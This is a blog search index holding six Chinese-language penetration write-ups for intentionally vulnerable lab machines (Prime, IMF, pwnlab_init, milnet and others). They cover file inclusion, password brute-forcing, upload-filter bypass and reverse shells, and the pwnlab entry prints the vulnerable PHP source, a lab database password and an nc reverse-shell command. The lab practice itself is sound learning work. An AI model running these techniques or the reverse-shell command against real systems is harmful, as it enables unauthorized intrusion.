<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Prime_Series靶机渗透</title>
      <link href="/2019/09/25/Prime_Series/"/>
      <url>/2019/09/25/Prime_Series/</url>
      
        <content type="html"><![CDATA[<p>扫IP扫端口  没什么东西 扫了一下目录是个wordpress站点<br><img src="1.png" alt="ip"><br><img src="2.png" alt="ip"><br>看见一个victor用户名 第一想法是爆破，然鹅。。有个🔨用<br><img src="4.png" alt="ip"><br>使用dirb扫了一下txt发现一个文件，访问了一下给了个github的wfuzz使用，还说访问一下location.txt文件，访问是个404，这尼玛又有🔨用?那就去github链接看一下<br><img src="3.png" alt="ip"><br>这个页面给了两个例子<br><img src="5.png" alt="ip"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMNAD = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something</span><br><span class="line">COMMAND = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hw 500 http://website-ip/index.php?FUZZ=something</span><br></pre></td></tr></table></figure><p>爆破无果又对着这页面思考许久，突然发现好像有点东西<br>第二个例子的网站是<a href="http://website-ip/index.php?FUZZ=something" target="_blank" rel="noopener">http://website-ip/index.php?FUZZ=something</a><br>然后wfuzz结果为file，于是回到主页面试了一下果然是这样<br><img src="6.png" alt="ip"><br>他说我找错文件了，刚才扫到的txt叫我访问location.txt，那就试一下这个<br><img src="7.png" alt="ip"><br>好的，得到下一步提示，在wordpress的页面使用secrettier360参数获得更多乐趣。。。。<br>NMD，一开始以为在wordpress目录下的php文件中进行参数测试，最后并不是<br><img src="8.png" alt="ip"><br>目录下存在image.php文件，原来是这里测试参数，试了一下存在LFI<br>一看是看了一下目录下的一些配置文件，没找到用户名密码，但是有数据库密码<br>仔细看/etc/passwd文件有一个地方提到了password.txt文件在/home/saket目录下，看了一下获得密码<br><img src="9.png" alt="ip"><br><img src="10.png" alt="ip"><br>成功登录进来，依旧是修改页面反弹shell<br>看了一番只有一个文件可以修改，修改为反弹shell脚本<br><img src="11.png" alt="ip"><br>访问<a href="http://192.168.40.208/wordpress/wp-content/themes/twentynineteen/secret.php" target="_blank" rel="noopener">http://192.168.40.208/wordpress/wp-content/themes/twentynineteen/secret.php</a><br>反弹shell，太菜还没有学后渗透提权，到此为止<br><img src="12.png" alt="ip"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnerable_docker靶机渗透</title>
      <link href="/2019/09/25/vulnerable-docker/"/>
      <url>/2019/09/25/vulnerable-docker/</url>
      
        <content type="html"><![CDATA[<p>扫ip扫端口 8000端口 是个wordpress站点<br><img src="1.png" alt="ip"><br>使用wpscan扫描一下存在的用户名  得到一个bob<br><img src="2.png" alt="ip"><br>再使用burp爆破密码成功登录<br><img src="3.png" alt="ip"><br>登陆以后修改404界面，我改成反弹shell的脚本，访问一下404页面成功反弹shell<br>还没有学后渗透提权，到此为止<br><img src="4.png" alt="ip"><br><img src="5.png" alt="ip"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IMF靶机渗透</title>
      <link href="/2019/09/24/IMF/"/>
      <url>/2019/09/24/IMF/</url>
      
        <content type="html"><![CDATA[<p>探测ip为192.168.40.199，扫描一波发现只有80端口<br><img src="2.png" alt="ip"><br><img src="1.png" alt="ip"><br>翻了一下在源码里找到个base64解密以后是allthefiles，看样子要扫目录<br><img src="3.png" alt="ip"><br>使用Dirbuster扫出三个base64样子的文件，拼接一下得到第二个flag<br><img src="4.png" alt="ip"><br>看起来是一个目录，访问了一下是个登陆界面<br><img src="5.png" alt="ip"><br>随便试一下登录发现用户名不存在会返回用户名错误，还有一点注释，翻译为数据库出了问题，所以密码是一个固定的密码<br><img src="7.png" alt="ip"><br>用户名爆破了一下没结果，返回到首页发现下面有三个邮箱地址，试了一下发现有一个是正确的用户名，使用burp爆破一下密码<br><img src="6.png" alt="ip"><br>操!爆破到一半想起既然默认密码那肯定使用了strcmp来比较字符串，然而strcmp字符串有一边是数组是则判断两个字符串相等，试了一下果然没错<br><img src="8.png" alt="ip"><br>登陆进来这几个功能好像没什么用啊<br><img src="9.png" alt="ip"><br>NMD搞好久以为是文件包含，试了一下原来是注入，然后得到一个新文件名，打开是个二维码，扫了一下得到文件uploadr942.php<br><img src="10.png" alt="ip"><br><img src="11.png" alt="ip"><br><img src="12.png" alt="ip"><br>一个文件上传的地方，但是不能上传php文件，绕了好久搞不便，看了一些别人写的，发现上传gif居然能执行php代码(那些鬼佬说是htaccess文件所以才会执行)，这尼玛什么瞎掰玩意，对文件内容也有过滤的，但是很容易就过了<br><img src="13.png" alt="ip"><br>最终反弹shell完事，还没有学后渗透提权，到此为止<br><img src="14.png" alt="ip"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnlab_init靶机渗透</title>
      <link href="/2019/09/24/pwnlab-init/"/>
      <url>/2019/09/24/pwnlab-init/</url>
      
        <content type="html"><![CDATA[<p>探测ip为192.168.40.198，扫描一下端口发现3306和一个不知道是什么的端口<br><img src="1.png" alt="ip"><br><img src="2.png" alt="ip"><br><img src="3.png" alt="ip"><br>又是文件包含漏洞，直接使用php://filter读源码<br>index源代码:这个地方cookie处有一个包含文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Multilingual. Not implemented yet.</span><br><span class="line">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span><br><span class="line">if (isset($_COOKIE[&apos;lang&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">include(&quot;lang/&quot;.$_COOKIE[&apos;lang&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">// Not implemented yet.</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span><br><span class="line">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span><br><span class="line">&lt;hr/&gt;&lt;br/&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&apos;page&apos;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;Use this server to upload and share image files inside the intranet&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>login源代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$mysqli = new mysqli($server, $username, $password, $database);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;user&apos;]) and isset($_POST[&apos;pass&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$luser = $_POST[&apos;user&apos;];</span><br><span class="line">$lpass = base64_encode($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE usecj0</span><br></pre></td></tr></table></figure><p>config源代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$server  = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;H4u%QJ_H99&quot;;</span><br><span class="line">$database = &quot;Users&quot;;</span><br><span class="line">Cj8</span><br></pre></td></tr></table></figure><p>在这里得到了数据库账号和密码，登录以后获得了登陆的账号和加密的密码，base64解密一下登录<br><img src="4.png" alt="ip"></p><p>然后就可以上传文件了 配合index中的cookie包含来执行一下phpinfo看看<br><img src="5.png" alt="ip"><br><img src="6.png" alt="ip"><br><img src="7.png" alt="ip"><br><img src="8.png" alt="ip"><br>最后使用命令执行nc -nv 10.2.4.85 7777 -e /bin/bash反弹shell<br><img src="9.png" alt="ip"><br>还没有学后渗透提权，到此为止</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>milnet-1.0靶机渗透</title>
      <link href="/2019/09/24/milnet-1.0/"/>
      <url>/2019/09/24/milnet-1.0/</url>
      
        <content type="html"><![CDATA[<p>探测ip为192.168.40.199，扫了端口发现只有22和80没什么东西<br><img src="1.png" alt="ip"><br><img src="2.png" alt="ip"><br><img src="8.png" alt="ip"><br>翻了一下发现没有功能点，目录也扫不出东西，抓了个包发现和页面上的东西一样，看来也是个文件包含<br>使用协议读取文件源代码，发现00截断用不了<br><img src="3.png" alt="ip"><br><img src="4.png" alt="ip"><br>解码后发现是参数连接php后缀，看样子不只是LFI还是RFI，这里需要用?号来绕过最后的PHP后缀限制<br><img src="5.png" alt="ip"><br><img src="6.png" alt="ip"><br>可以执行命令后那就反弹个shell<br><img src="7.png" alt="ip"><br>还没有学后渗透提权，到此为止</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LordOfTheRoot靶机渗透</title>
      <link href="/2019/09/24/LordOfTheRoot/"/>
      <url>/2019/09/24/LordOfTheRoot/</url>
      
        <content type="html"><![CDATA[<p>探测ip为192.168.40.143<br><img src="7.png" alt="ip"><br>使用nmap扫描一下端口发现只有80端口<br><img src="8.png" alt="端口"><br>网站就一个登录功能一个上传文件功能，然后发现url应该有文件包含漏洞试一下00截断，是一个本地包含<br><img src="5.png" alt="端口"><br><img src="4.png" alt="端口"><br>既然有包含那就上传一个文件包含就可以getshell了<br>在上传的表单中填写的邮箱和密码是可以登录的，也就是填什么登录就填什么<br>这里会检测文件开头的几个字符是否是PDF文件，传个正常的改一下就好，先试试phpinfo能不能运行<br><img src="2.png" alt="端口"><br>上传文件后没有返回路径，来到登录页面使用表单中填写的邮箱和密码登录可以看见上传的文件路径，然后就执行成功了<br><img src="1.png" alt="端口"><br><img src="3.png" alt="端口"><br>那么现在执行以下反弹shell就可以了<br><img src="6.png" alt="端口"><br>还没有学后渗透提权，到此为止</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
